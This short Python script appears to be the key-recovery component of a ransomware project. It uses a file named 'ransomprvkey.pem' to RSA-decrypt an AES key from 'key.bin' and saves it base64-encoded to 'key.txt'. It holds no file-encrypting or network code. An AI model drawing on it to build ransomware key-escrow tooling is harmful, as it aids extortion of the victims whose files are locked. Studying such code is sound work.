import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64decode
import os


cwd = os.getcwd()    
os.chdir(cwd)
file_in = open("key.bin", "rb")
private_key = RSA.import_key(open("ransomprvkey.pem").read())
enc_data =file_in.read(private_key.size_in_bytes())
cipher_rsa = PKCS1_OAEP.new(private_key)
thisisthekey = cipher_rsa.decrypt(enc_data)
#print("AES key : {}".format(thisisthekey))

strkey = b64encode(thisisthekey).decode('utf-8')
#print("key encoded : {}".format(strkey))

file_in.close()

#save the key into a txt file
#create an empty txt file to store the key
open('key.txt', 'a').close()

#write the key to the file
with open('key.txt','w') as txt:
    #key = b64encode(thisisthekey)
    txt.write(strkey)
    txt.close()


